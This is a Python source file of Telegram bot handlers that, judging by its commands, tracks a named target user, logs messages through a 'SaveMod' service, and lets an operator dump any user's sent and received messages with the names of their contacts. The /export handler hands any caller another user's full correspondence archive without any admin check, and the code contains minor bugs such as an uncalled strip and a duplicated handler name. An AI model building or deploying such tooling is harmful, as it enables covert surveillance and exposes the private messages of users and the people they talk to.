import datetime
from email.mime import message

from aiogram import Router, F
from aiogram.filters import Command
from aiogram.types import BufferedInputFile, Message

from core.savemod_service import SaveModService

from datetime import datetime
router = Router()

ADMIN_IDS = [8418446543, 8566322265]

def setup_tracker_handlers(tracker_service, savemod_service):
    @router.message(Command("tracker"))
    async def start_tracker_handler(message: Message):
        parts = message.text.split(maxsplit=1)
    
        if len(parts) < 2 or not parts[1].strip:
            await message.answer(
                "❗ Укажи цель\n"
                "/tracker username\n"
                "/tracker user_id"
            )
            return
    
        target = parts[1].strip()
    
        try:
            await tracker_service.start(message.from_user.id, target)
            await message.answer("✅ Трекер запущен")
        except RuntimeError as e:
            await message.answer(str(e))

    @router.message(Command("stop"))
    async def stop_tracker_handler(message:Message):
        user_id = message.from_user.id
        try:
            await tracker_service.stop(user_id)

        except RuntimeError as e:
            await message.answer(str(e))


    @router.message(F.text == "/savemod_on")
    async def savemod_on_handler(message: Message):
        await savemod_service.enable(message.from_user.id)
        await message.answer("✅ SaveMod включён. Что бы выключить напишите /savemod_off")
    @router.message(F.text == "/savemod_off")
    async def savemod_on_handler(message: Message):
        await savemod_service.disable(message.from_user.id)
        await message.answer("❌SaveMod выключен. Что бы включить напишите /savemod_on")
# bot/handlers/tracker.py
# bot/handlers/tracker.py

    @router.message(Command("admin"))
    async def admin_log_handler(message: Message):
        if message.from_user.id not in ADMIN_IDS:
            return await message.answer("❌ Команда доступна только администратору.")
        args = message.text.split()
        if len(args) < 2 or not args[1].isdigit():
            return await message.answer("⚠️ Используйте: <code>/admin ID</code>", parse_mode="HTML")

        target_id = int(args[1])
        logs = await savemod_service.get_user_logs(target_id)

        if not logs:
            return await message.answer(f"❌ Логи для пользователя <code>{target_id}</code> не найдены.", parse_mode="HTML")

        client = await savemod_service.session_manager.get_client(message.from_user.id)

        await message.answer(f"⏳ Формирую отчет для <code>{target_id}</code>, подгружаю имена...")
        # Заголовок
        header = f"📋 <b>ОТЧЕТ ПОЛЬЗОВАТЕЛЯ:</b> <code>{target_id}</code>\n"
        header += "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
        
        res = [header]
        
        names_cache = {}

        for log in logs:
            # Форматируем время из timestamp
            time_str = datetime.fromtimestamp(log.date).strftime("%d.%m | %H:%M:%S")
            
            peer_id = log.chat_id if log.sender_id == target_id else log.sender_id


            if peer_id not in names_cache:
                if client:
                    names_cache[peer_id] = await savemod_service.get_entity_name(client, peer_id)
                else:
                    names_cache[peer_id] = f"ID:{peer_id}"

            contact_name = names_cache[peer_id]

            # Определяем тип сообщения
            if log.sender_id == target_id:
                # Наша цель отправила сообщение
                type_tag = "📤 <b>ОТПРАВЛЕНО</b>"
                contact = f"кому: <code>{contact_name}</code>"
            else:
                # Нашей цели пришло сообщение
                type_tag = "📥 <b>ПОЛУЧЕНО</b>"
                contact = f"от: <code>{contact_name}</code>"
            # Собираем блок сообщения
            entry = (
                f"{type_tag}\n"
                f"👤 {contact}\n"
                f"🕒 {time_str}\n"
                f"📝 <code>{log.text}</code>\n"
                f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯"
            )
            res.append(entry)

        # Склеиваем всё в один текст
        output_text = "\n".join(res)

        # Отправка с учетом лимита Telegram (4096 символов)
        if len(output_text) > 4096:
            for x in range(0, len(output_text), 4096):
                await message.answer(output_text[x:x+4096], parse_mode="HTML")
        else:
            await message.answer(output_text, parse_mode="HTML")
        
    @router.message(Command("export"))
    async def export_logs_handler(message: Message):
        args = message.text.split()
        if len(args) < 2 or not args[1].isdigit():
            return await message.answer("⚠️ Используйте: <code>/export ID</code>", parse_mode="HTML")
        target_id = int(args[1])
        await message.answer(f"⏳ Формирую архив переписки для <code>{target_id}</code>...", parse_mode="HTML")

        file_content = await savemod_service.format_logs_to_txt(target_id)

        if not file_content:
            return await message.answer(f"❌ Логи для пользователя <code>{target_id}</code> не найдены.", parse_mode="HTML")
        
        file_data = BufferedInputFile(
            file_content.encode('utf-8'),
            filename=f"logs_{target_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        )

        await message.answer_document(
            file_data,
            caption=f"📁 Архив переписки для <code>{target_id}</code>",
            parse_mode="HTML"
        )